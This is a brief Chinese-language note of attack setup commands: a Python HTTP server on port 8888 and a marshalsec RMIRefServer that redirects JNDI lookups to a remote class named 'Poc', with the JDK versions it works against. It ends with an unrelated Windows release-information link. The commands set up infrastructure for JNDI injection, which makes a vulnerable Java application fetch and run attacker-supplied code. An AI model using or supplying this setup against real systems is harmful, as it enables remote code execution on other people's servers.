启动http服务
python3 -m http.server --bind 0.0.0.0 8888

启动rmi服务
适用jdk版本：JDK 6u132, JDK 7u122, JDK 8u113之前
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://127.0.0.1:8888/#Poc" 9999

https://docs.microsoft.com/en-us/windows/release-health/release-information


